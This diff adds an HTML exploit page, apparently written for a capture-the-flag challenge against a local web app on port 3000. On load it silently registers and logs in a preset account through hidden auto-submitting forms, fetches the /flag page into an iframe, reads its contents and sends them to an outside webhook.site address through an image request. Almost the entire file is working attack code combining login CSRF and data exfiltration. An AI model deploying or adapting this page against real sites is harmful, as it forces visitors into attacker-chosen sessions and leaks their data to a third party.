@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe name="f1" id="f1"></iframe>
+<iframe name="f2" id="f2"></iframe>
+
+<form id="regForm" method="POST" action="http://localhost:3000/register" target="f1">
+  <input name="username" value="hackuser2">
+  <input name="password" value="hackuser2">
+</form>
+
+<form id="loginForm" method="POST" action="http://localhost:3000/login" target="f1">
+  <input name="username" value="hackuser2">
+  <input name="password" value="hackuser2">
+</form>
+
+<script>
+document.getElementById('regForm').submit();
+
+setTimeout(function(){
+  document.getElementById('loginForm').submit();
+}, 200);
+
+// flag를 같은 iframe에서 GET
+setTimeout(function(){
+  document.getElementById('f1').contentWindow.location.href = 'http://localhost:3000/flag';
+}, 500);
+
+setTimeout(function(){
+  try {
+    var c = document.getElementById('f1').contentDocument.body.innerHTML;
+    new Image().src = 'https://webhook.site/showontest?flag=' + encodeURIComponent(c);
+  } catch(e) {
+    new Image().src = 'https://webhook.site/showontest?err=' + encodeURIComponent(e.message);
+  }
+}, 800);
+</script>
+</body>
+</html>
